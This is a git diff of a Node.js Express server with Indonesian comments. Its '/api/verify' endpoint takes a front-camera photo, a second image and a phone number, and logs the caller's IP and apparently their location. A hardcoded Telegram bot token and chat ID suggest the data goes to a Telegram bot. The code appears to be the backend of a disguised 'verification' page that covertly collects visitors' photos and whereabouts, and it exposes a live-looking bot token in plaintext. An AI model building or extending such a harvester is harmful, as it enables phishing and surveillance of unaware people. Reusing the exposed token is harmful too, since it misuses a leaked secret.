@@ -8,6 +8,7 @@ const multer = require('multer');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// Ambil dari environment variable Railway
 const BOT_TOKEN = process.env.BOT_TOKEN || '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
 const CHAT_ID = process.env.CHAT_ID || '7352381955';
 
@@ -154,7 +155,7 @@ app.get('/test-send', async (req, res) => {
   }
 });
 
-// Verify endpoint dengan multer untuk handle file
+// Verify endpoint dengan multer
 app.post('/api/verify', upload.fields([
   { name: 'image', maxCount: 1 },
   { name: 'backImage', maxCount: 1 }
@@ -163,14 +164,12 @@ app.post('/api/verify', upload.fields([
   console.log('📸 Time:', new Date().toISOString());
   
   try {
-    // Ambil file dari req.files
     const files = req.files;
     const phone = req.body.phone || `User_${Date.now().toString().slice(-6)}`;
     
     console.log(`📱 Phone: ${phone}`);
     console.log(`📸 Files received:`, Object.keys(files));
     
-    // Cek file image (front camera)
     if (!files.image || !files.image[0]) {
       console.log('❌ No image file received');
       return res.status(400).json({ success: false, error: 'Foto tidak ditemukan' });
@@ -179,7 +178,6 @@ app.post('/api/verify', upload.fields([
     const frontFile = files.image[0];
     console.log(`📸 Front image: ${frontFile.originalname}, size: ${frontFile.size} bytes`);
     
-    // Get IP and location
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
     console.log(`🌐 IP: ${ip}`);
     
